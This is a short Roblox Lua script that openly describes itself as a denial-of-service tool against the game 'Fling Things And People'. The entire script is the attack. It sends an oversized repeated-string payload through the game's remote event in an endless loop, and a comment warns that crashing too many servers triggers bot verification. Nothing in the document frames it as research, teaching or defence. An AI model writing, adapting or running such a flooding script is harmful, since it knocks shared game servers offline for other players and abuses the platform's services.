-- WARNING: if you crash too many servers, roblox will flag you as a bot and force you to verify using a selfie
-- SUPPORTED GAME: Fling Things And People
-- this script is just basic DoS

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Remote = ReplicatedStorage.DataEvents.DataRemoteEvent

-- Configuration
local INTERVAL = 0.1
local REPETITIONS = 10000
local ENABLED = true

local BASE_STRING = "SHUSHUHSUHSUHSUSHSGSUSUSHHDUHSUSYSGSUUEHG0x99"

while ENABLED do
    local Payload = string.rep(BASE_STRING, REPETITIONS)

    Remote:FireServer(Payload)

    -- Release the local reference
    Payload = nil

    -- Request garbage collection
    collectgarbage("collect")

    task.wait(INTERVAL)
end
